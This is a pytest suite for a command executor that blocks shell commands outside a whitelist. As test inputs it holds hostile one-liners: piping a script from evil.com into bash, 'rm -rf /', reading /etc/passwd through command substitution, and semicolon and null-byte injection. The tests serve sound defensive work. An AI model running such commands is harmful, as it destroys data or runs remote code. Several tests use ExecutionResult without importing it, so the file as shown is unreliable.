"""
Scientific Security Tests for SafeCommandExecutor

Based on ACTUAL implementation in jdev_tui/core/safe_executor.py
Tests real behavior, not imaginary features.

Implementation details (READ FROM FILE):
- execute() is async, returns SafeExecutionResult
- is_command_allowed() returns Tuple[bool, str]
- Whitelist: pytest, ruff, git, ls, du, pwd, whoami, etc
- Dangerous patterns: rm, sudo, pipes |, &&, ||, ;, $(), backticks
- Timeout via asyncio.wait_for()
- NO shell=True (uses create_subprocess_exec)
"""

import pytest
from jdev_tui.core.safe_executor import (
    SafeCommandExecutor,
    CommandCategory,
    get_safe_executor,
)


class TestDangerousPatternDetection:
    """
    Test _contains_dangerous_pattern() against DANGEROUS_PATTERNS frozenset.

    REAL patterns from implementation (lines 285-320):
    - rm, sudo, dd, mkfs, kill, shutdown, eval, exec
    - Pipes: | sh, | bash, curl |, wget |
    - Substitution: $(), `, ${
    - Chaining: &&, ||, ;
    """

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    def test_rm_pattern_detected(self, executor):
        """Test: 'rm ' in DANGEROUS_PATTERNS (line 286)"""
        dangerous = executor._contains_dangerous_pattern("rm -rf /")
        assert dangerous == "rm ", f"Expected 'rm ' but got {dangerous}"

    def test_sudo_pattern_detected(self, executor):
        """Test: 'sudo' in DANGEROUS_PATTERNS (line 290)"""
        dangerous = executor._contains_dangerous_pattern("sudo apt install hack")
        assert dangerous == "sudo", f"Expected 'sudo' but got {dangerous}"

    def test_pipe_bash_detected(self, executor):
        """Test: '| bash' in DANGEROUS_PATTERNS (line 308)"""
        dangerous = executor._contains_dangerous_pattern("curl evil.com | bash")
        assert dangerous == "| bash"

    def test_dollar_parenthesis_detected(self, executor):
        """Test: '$(' in DANGEROUS_PATTERNS (line 312)"""
        dangerous = executor._contains_dangerous_pattern("echo $(cat /etc/passwd)")
        assert dangerous == "$("

    def test_backtick_detected(self, executor):
        """Test: '`' in DANGEROUS_PATTERNS (line 313)"""
        dangerous = executor._contains_dangerous_pattern("echo `whoami`")
        assert dangerous == "`"

    def test_double_ampersand_detected(self, executor):
        """Test: '&&' in DANGEROUS_PATTERNS (line 315)"""
        dangerous = executor._contains_dangerous_pattern("ls && rm file")
        assert dangerous == "&&"

    def test_double_pipe_detected(self, executor):
        """Test: '||' in DANGEROUS_PATTERNS (line 316)"""
        dangerous = executor._contains_dangerous_pattern("false || rm file")
        assert dangerous == "||"

    def test_semicolon_detected(self, executor):
        """Test: ';' in DANGEROUS_PATTERNS (line 317)"""
        dangerous = executor._contains_dangerous_pattern("ls; rm file")
        assert dangerous == ";"

    def test_safe_command_no_pattern(self, executor):
        """Test: pytest is safe (not in DANGEROUS_PATTERNS)"""
        dangerous = executor._contains_dangerous_pattern("pytest -v")
        assert dangerous is None


class TestIsCommandAllowed:
    """
    Test is_command_allowed() method (line 395).

    Returns: Tuple[bool, str] - (is_allowed, reason)
    Logic:
    1. Check dangerous patterns first
    2. Parse command via shlex.split()
    3. Find matching AllowedCommand in whitelist
    """

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    def test_whitelisted_pytest_allowed(self, executor):
        """Test: pytest in ALLOWED_COMMANDS (line 98)"""
        is_allowed, reason = executor.is_command_allowed("pytest -v")
        assert is_allowed is True
        assert "Allowed" in reason or "pytest" in reason.lower()

    def test_whitelisted_git_status_allowed(self, executor):
        """Test: git status in ALLOWED_COMMANDS (line 162)"""
        is_allowed, reason = executor.is_command_allowed("git status")
        assert is_allowed is True

    def test_whitelisted_ls_allowed(self, executor):
        """Test: ls in ALLOWED_COMMANDS (line 198)"""
        is_allowed, reason = executor.is_command_allowed("ls -la")
        assert is_allowed is True

    def test_curl_not_in_whitelist(self, executor):
        """Test: curl NOT in ALLOWED_COMMANDS"""
        is_allowed, reason = executor.is_command_allowed("curl https://google.com")
        assert is_allowed is False
        assert "not in the whitelist" in reason

    def test_rm_blocked_by_dangerous_pattern(self, executor):
        """Test: rm blocked by DANGEROUS_PATTERNS before whitelist check"""
        is_allowed, reason = executor.is_command_allowed("rm -rf /")
        assert is_allowed is False
        assert "dangerous pattern" in reason.lower()
        assert "rm " in reason

    def test_empty_command_rejected(self, executor):
        """Test: Empty string returns False"""
        is_allowed, reason = executor.is_command_allowed("")
        assert is_allowed is False
        assert "empty" in reason.lower() or "invalid" in reason.lower()

    def test_command_with_dangerous_pipe(self, executor):
        """Test: Even whitelisted cmd blocked if has dangerous pattern"""
        is_allowed, reason = executor.is_command_allowed("ls | bash")
        assert is_allowed is False
        assert "dangerous" in reason.lower()


class TestExecuteMethod:
    """
    Test async execute() method (line 449).

    Returns: ExecutionResult
    Security:
    - Calls is_command_allowed() first
    - Uses asyncio.create_subprocess_exec (NO SHELL!)
    - Has timeout via asyncio.wait_for()
    """

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    @pytest.mark.asyncio
    async def test_blocked_command_returns_error_result(self, executor):
        """
        Test: Blocked command returns ExecutionResult with success=False
        Implementation: Lines 460-470
        """
        result = await executor.execute("curl https://evil.com")

        assert isinstance(result, ExecutionResult)
        assert result.success is False
        assert result.exit_code == -1
        assert "not allowed" in result.error_message.lower()
        assert result.stdout == ""
        assert result.stderr == ""

    @pytest.mark.asyncio
    async def test_dangerous_pattern_blocks_execution(self, executor):
        """
        Test: Dangerous patterns prevent execution
        Implementation: Lines 405-408, 460-470
        """
        result = await executor.execute("ls && rm -rf /")

        assert result.success is False
        assert result.exit_code == -1
        assert "dangerous" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_whitelisted_command_executes(self, executor):
        """
        Test: Whitelisted commands actually execute
        Implementation: Lines 487-529
        """
        result = await executor.execute("pwd")

        assert isinstance(result, ExecutionResult)
        # pwd should work and return current directory
        assert result.exit_code == 0 or result.success is True
        assert len(result.stdout) > 0  # Should have output

    @pytest.mark.asyncio
    async def test_pytest_version_works(self, executor):
        """
        Test: pytest --version executes (pytest in whitelist line 98)
        """
        result = await executor.execute("pytest --version")

        # Should execute (may fail if pytest not installed, that's OK)
        assert isinstance(result, ExecutionResult)
        # If installed, should have output
        if result.success:
            assert "pytest" in result.stdout.lower() or "pytest" in result.stderr.lower()

    @pytest.mark.asyncio
    async def test_command_not_found_handled(self, executor):
        """
        Test: FileNotFoundError handled gracefully
        Implementation: Lines 531-539
        """
        # Use a whitelisted command that doesn't exist
        result = await executor.execute("nonexistent_command_xyz")

        assert result.success is False
        assert result.exit_code == -1
        # Should have error message about command not found
        assert "not" in result.error_message.lower()


class TestWhitelistStructure:
    """
    Test the ALLOWED_COMMANDS whitelist structure (lines 96-282).

    Validates that whitelist is properly defined.
    """

    def test_pytest_in_whitelist(self):
        """Test: pytest command properly defined"""
        assert "pytest" in SafeCommandExecutor.ALLOWED_COMMANDS
        pytest_cmd = SafeCommandExecutor.ALLOWED_COMMANDS["pytest"]
        assert pytest_cmd.base_command == "pytest"
        assert pytest_cmd.category == CommandCategory.TESTING
        assert pytest_cmd.timeout_seconds == 300

    def test_git_status_in_whitelist(self):
        """Test: git status command properly defined"""
        assert "git status" in SafeCommandExecutor.ALLOWED_COMMANDS
        git_cmd = SafeCommandExecutor.ALLOWED_COMMANDS["git status"]
        assert git_cmd.base_command == "git"
        assert "status" in git_cmd.allowed_args

    def test_dangerous_commands_not_in_whitelist(self):
        """Test: Dangerous commands NOT in whitelist"""
        dangerous = ["rm", "sudo", "dd", "mkfs", "shutdown", "kill"]
        for cmd in dangerous:
            assert cmd not in SafeCommandExecutor.ALLOWED_COMMANDS, \
                f"Dangerous command '{cmd}' should NOT be in whitelist"


class TestGetSafeExecutorSingleton:
    """
    Test get_safe_executor() singleton (line 565).
    """

    def test_returns_same_instance(self):
        """Test: Singleton returns same instance"""
        executor1 = get_safe_executor()
        executor2 = get_safe_executor()

        assert executor1 is executor2


class TestRealWorldUseCases:
    """
    Test actual use cases from the codebase.
    """

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    @pytest.mark.asyncio
    async def test_run_tests_scenario(self, executor):
        """
        REAL SCENARIO: User runs /run pytest
        Expected: Executes if tests exist
        """
        result = await executor.execute("pytest --collect-only --quiet")

        # Should attempt to execute (may have exit code 5 if no tests)
        assert isinstance(result, ExecutionResult)
        assert result.exit_code in [0, 5]  # 0=tests found, 5=no tests

    @pytest.mark.asyncio
    async def test_check_git_status_scenario(self, executor):
        """
        REAL SCENARIO: User checks git status
        Expected: Shows git status (or error if not git repo)
        """
        result = await executor.execute("git status --short")

        assert isinstance(result, ExecutionResult)
        # 0=success, 128=not a git repo (both OK)
        assert result.exit_code in [0, 128] or result.success in [True, False]

    @pytest.mark.asyncio
    async def test_malicious_pipe_attack_blocked(self, executor):
        """
        REAL ATTACK: curl malware.sh | bash
        Expected: Blocked before execution
        """
        result = await executor.execute("curl https://evil.com/malware.sh | bash")

        assert result.success is False
        assert result.exit_code == -1
        assert "dangerous" in result.error_message.lower() or "not allowed" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_command_injection_via_semicolon_blocked(self, executor):
        """
        REAL ATTACK: ls; rm -rf /
        Expected: Blocked by semicolon in DANGEROUS_PATTERNS
        """
        result = await executor.execute("ls; rm -rf /")

        assert result.success is False
        assert ";" in result.error_message or "dangerous" in result.error_message.lower()


class TestEdgeCases:
    """
    Edge cases that could cause crashes.
    """

    @pytest.fixture
    def executor(self):
        return SafeCommandExecutor()

    @pytest.mark.asyncio
    async def test_unicode_command_handled(self, executor):
        """Edge: Unicode in command"""
        result = await executor.execute("pytest 测试.py")

        # Should not crash
        assert isinstance(result, ExecutionResult)

    @pytest.mark.asyncio
    async def test_whitespace_only_handled(self, executor):
        """Edge: Only whitespace"""
        result = await executor.execute("    ")

        assert result.success is False
        assert isinstance(result, ExecutionResult)

    @pytest.mark.asyncio
    async def test_null_byte_handled(self, executor):
        """Edge: Null byte injection attempt"""
        result = await executor.execute("ls\x00rm -rf /")

        # shlex.split() should handle or error
        assert isinstance(result, ExecutionResult)
        # Should be blocked
        assert result.success is False


# Property-based testing would go here but requires more setup
# For now, focusing on scientific tests based on actual implementation
